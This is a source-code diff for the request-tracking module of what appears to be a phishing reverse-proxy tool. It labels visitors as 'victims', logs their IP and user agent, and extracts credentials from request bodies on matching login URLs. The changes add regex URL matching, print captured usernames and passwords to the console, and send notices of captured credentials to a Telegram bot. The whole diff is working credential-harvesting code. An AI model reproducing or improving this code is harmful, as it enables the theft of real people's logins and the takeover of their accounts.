@@ -39,7 +39,7 @@ const (
 
 const (
 	blockExtension = "JS,CSS,MAP,WOFF,SVG,SVC,JSON,GIF,ICO"
-	blockMedia     = "image/*,audio/*,video/*,font/*,application/*"
+	blockMedia     = "image/*,audio/*,video/*,font/*"
 )
 
 var DisabledExtensions = strings.Split(strings.ToLower(blockExtension), ",")
@@ -55,6 +55,7 @@ type Tracker struct {
 	Header         string
 	Landing        string
 	ValidatorRegex *regexp.Regexp
+	TrackerLength  int
 }
 
 // Trace object structure
@@ -159,6 +160,9 @@ func Load(s *session.Session) (m *Tracker, err error) {
 		}
 	}
 
+	// get the tracker length
+	m.TrackerLength = len(m.makeID())
+
 	m.Important("loaded successfully")
 	return
 }
@@ -246,7 +250,7 @@ func (module *Tracker) makeID() string {
 	return str.Generate(1)
 }
 
-// TrackRequest tracks an HTTP Request
+// TrackRequest tracks an HTTP RequestTemplate
 func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 
 	t = module.makeTrace("")
@@ -364,12 +368,11 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 		}
 
 		module.PushVictim(v)
-		module.Info("New victim [%s] IP[%s] UA[%s]", tui.Bold(tui.Red(t.ID)), IPSource, request.UserAgent())
-		module.Info("[%s] %s://%s%s", request.Method, request.URL.Scheme, request.Host, request.URL.Path)
+		module.Info("[+] victim: %s \n\t%s\n\t%s", tui.Bold(tui.Red(t.ID)), tui.Yellow(IPSource), tui.Yellow(request.UserAgent()))
+		//module.Debug("[%s] %s://%s%s", request.Method, request.URL.Scheme, request.Host, request.URL.Path)
 	}
 
 	v.RequestCount++
-
 	if module.Type == "path" && isTrackedPath {
 		request.URL.Path = module.Session.Config.Tracking.RedirectTo
 	}
@@ -446,18 +449,23 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
 	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
 	for _, c := range t.Session.Config.Tracking.Urls.Credentials {
-		if request.URL.Path == c {
 
-			t.Verbose("[%s] there might be credentials here.")
+		// If the URL is a wildcard, then we need to check if the request URL matches the wildcard
+		matched := false
+		if strings.HasPrefix(c, "^") && strings.HasSuffix(c, "$") {
+			matched, _ = regexp.MatchString(c, request.URL.Path)
+		} else {
+			matched = request.URL.Path == c
+		}
+
+		if matched {
+			//t.Verbose("[%s] there might be credentials here.")
 			for _, p := range t.Session.Config.Tracking.Patterns {
-
 				// Case *sensitive* matching
 				if strings.Contains(body, p.Matching) {
-
 					// Extract it
 					value := InnerSubstring(body, p.Start, p.End)
 					if value != "" {
-
 						mediaType := strings.ToLower(request.Header.Get("Content-Type"))
 						if strings.Contains(mediaType, "urlencoded") {
 							value, err = url.QueryUnescape(value)
@@ -476,18 +484,23 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 						if err != nil {
 							return false, err
 						}
-						t.Info("[%s] New credentials! [%s:%s]", t.ID, creds.Key, creds.Value)
+
 						found = true
 
-						tel := telegram.Self(t.Session)
-						if tel != nil {
-							message := fmt.Sprintf("[%s] New credentials! [%s]", t.ID, creds.Key)
+						message := fmt.Sprintf("[%s] [+] credentials: %s", t.ID, tui.Bold(creds.Key))
+						t.Info("%s=%s", message, tui.Bold(tui.Red(creds.Value)))
+						if tel := telegram.Self(t.Session); tel != nil {
 							tel.Send(message)
 						}
 					}
 				}
 			}
+
+			if found {
+				break
+			}
 		}
+
 	}
 
 	if found {
